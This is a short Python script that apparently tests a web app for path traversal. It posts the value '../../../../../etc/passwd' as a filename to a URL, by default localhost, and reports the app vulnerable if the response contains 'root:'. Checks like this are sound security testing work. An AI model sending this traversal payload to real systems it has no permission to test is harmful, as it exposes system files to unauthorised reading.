import requests


def main(url):
    req = requests.post(url, data={'filename' : "../../../../../etc/passwd"})
    result = bool(req.text.find("root:") > 0)
    print(req.text)
    if result :
        msg = "The app is vulnerable"
    else :
        msg = "You are in good hands"
    return (result, msg)

if __name__ == '__main__':
	url = "http://localhost/"
	res = main(url)
	print(res)